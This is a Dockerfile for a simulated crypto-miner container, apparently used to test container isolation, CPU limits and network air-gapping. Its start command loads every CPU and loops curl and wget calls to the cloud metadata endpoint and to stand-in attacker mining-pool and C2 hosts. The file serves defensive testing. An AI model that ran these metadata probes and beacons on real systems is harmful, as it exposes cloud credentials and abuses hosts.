# Malicious Crypto Miner Container
# Purpose: Test resource isolation and detection

FROM alpine:latest

# Install tools that miners typically use
RUN apk add --no-cache \
    curl \
    wget \
    openssl \
    ca-certificates

# Simulate mining behavior
CMD ["/bin/sh", "-c", "\
  echo 'Starting simulated crypto miner...'; \
  # CPU intensive operation (simulates mining) \
  for i in $(seq 1 $(nproc)); do \
    openssl speed -multi $(nproc) >/dev/null 2>&1 & \
  done; \
  # Attempt to contact C2 server \
  while true; do \
    curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null || true; \
    curl -s http://mining-pool.attacker.com/api/submit 2>/dev/null || true; \
    wget -q -O /dev/null http://c2.attacker.com/beacon 2>/dev/null || true; \
    sleep 5; \
  done \
"]

# Usage:
# docker build -t malicious-miner -f crypto_miner.Dockerfile .
# 
# Test with ECI + Air-gap:
# docker run --rm --network none --cpus=0.5 --memory=256m malicious-miner
#
# Expected: CPU limited, no network access, container contained
